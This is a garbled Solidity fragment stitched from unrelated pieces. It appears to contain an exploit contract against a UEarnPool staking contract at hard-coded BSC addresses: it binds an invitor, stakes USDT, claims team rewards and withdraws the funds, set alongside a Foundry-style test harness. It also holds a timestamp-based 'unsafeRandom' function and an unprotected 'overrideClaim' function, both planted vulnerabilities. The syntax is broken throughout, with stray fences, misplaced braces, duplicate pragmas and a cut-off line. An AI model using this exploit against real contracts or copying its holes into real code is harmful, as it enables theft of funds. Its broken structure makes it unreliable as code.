
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
interface UEarnPool{
    function bindInvitor(address invitor) external;
    function stake(uint256 pid, uint256 amount) external;
    function claimTeamReward(address account) external};
contract claimReward{
    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    function bind(address invitor) external{
        Pool.bindInvitor(invitor)};
    function stakeAndClaimReward(uint256 amount) external{
        USDT.approve(address(address(Pool)), type(uint).max);
        Pool.stake(0, amount);
        Pool.claimTeamReward(address(this))};
    function withdraw(address receiver) external{
        USDT.transfer(receiver, USDT.balanceOf(address(this)))};
contract ContractTest is DSTest{
    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address[] contractList;
    Cheat
function unsafeRandom() public view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));}
function overrideClaim(bytes32 key) public {
    claims[key] = msg.sender}